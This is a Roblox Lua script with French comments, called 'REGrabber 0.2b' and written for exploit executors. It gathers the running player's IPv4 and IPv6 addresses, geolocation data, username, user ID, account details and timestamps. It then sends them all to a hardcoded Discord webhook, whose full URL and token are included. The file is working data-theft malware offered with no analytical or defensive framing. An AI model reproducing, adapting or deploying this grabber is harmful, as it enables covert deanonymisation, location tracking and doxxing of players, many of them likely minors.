

local Webhook = "https://discord.com/api/webhooks/1294357215477760061/hy-m4j87g0R_-x2VWWQtj9jovJb_uLRcDWxJuB9VPcY7z0MxMSzYNP3059YTi5150N6w"

local IPv4 = game:HttpGet("https://api.ipify.org") -- IPv4 (service d'API)
local IPv6 = game:HttpGet("https://api64.ipify.org") -- IPv6 (service d'API)

local HTTPbin = game:HttpGet("https://httpbin.org/get")

local GeoPlug = game:HttpGet("http://www.geoplugin.net/json.gp?ip="..IPv4)

local Headers = {["content-type"] = "application/json"}

local LocalPlayer = game:GetService("Players").LocalPlayer
local AccountAge = LocalPlayer.AccountAge -- Durée du compte en jours
local MembershipType = tostring(LocalPlayer.MembershipType)
local UserId = LocalPlayer.UserId -- ID utilisateur
local PlayerName = LocalPlayer.Name -- Nom du joueur
local DisplayName = LocalPlayer.DisplayName -- Nom affiché
local PlaceID = game.PlaceId -- ID du jeu en cours

-- Obtenir la date et l'heure de connexion
local LogTime = os.date('!%Y-%m-%d-%H:%M:%S GMT+0')

-- Fonction pour identifier l'exploit utilisé
function identifyexploit()
   local success, result = pcall(identifyexecutor)
   if success then return result end
   return "Unknown Exploit"
end

-- Préparation des données pour le webhook
local PlayerData = {
    ["content"] = "",
    ["embeds"] = {{
        ["author"] = { ["name"] = "REGrabber 0.2b" },
        ["title"] = PlayerName,
        ["description"] = "aka "..DisplayName,
        ["fields"] = {
            { ["name"] = "Username:", ["value"] = PlayerName, ["inline"] = true },
            { ["name"] = "Membership Type:", ["value"] = MembershipType, ["inline"] = true },
            { ["name"] = "Account Age (days):", ["value"] = AccountAge, ["inline"] = true },
            { ["name"] = "UserId:", ["value"] = UserId, ["inline"] = true },
            { ["name"] = "IPv4:", ["value"] = IPv4, ["inline"] = true },
            { ["name"] = "IPv6:", ["value"] = IPv6, ["inline"] = true },
            { ["name"] = "Place ID:", ["value"] = PlaceID, ["inline"] = true },
            { ["name"] = "Executor:", ["value"] = identifyexploit(), ["inline"] = true },
            { ["name"] = "Log Time:", ["value"] = LogTime, ["inline"] = true },
            { ["name"] = "HTTPbin Data (JSON):", ["value"] = "```json\n"..HTTPbin.."```", ["inline"] = false },
            { ["name"] = "geoPlugin Data (JSON):", ["value"] = "```json\n"..GeoPlug.."```", ["inline"] = false },
        },
    }}
}

-- Encodage des données en JSON
local HttpService = game:GetService('HttpService')
local PlayerDataJson = HttpService:JSONEncode(PlayerData)

-- Fonction pour envoyer les données au webhook
local function sendData()
    local HttpRequest
    if syn and syn.request then
        HttpRequest = syn.request
    elseif http_request then
        HttpRequest = http_request
    else
        warn("Aucun environnement compatible pour envoyer des requêtes HTTP.")
        return
    end

    HttpRequest({
        Url = Webhook,
        Body = PlayerDataJson,
        Method = "POST",
        Headers = Headers
    })
end

-- Appeler la fonction pour envoyer les données
sendData()
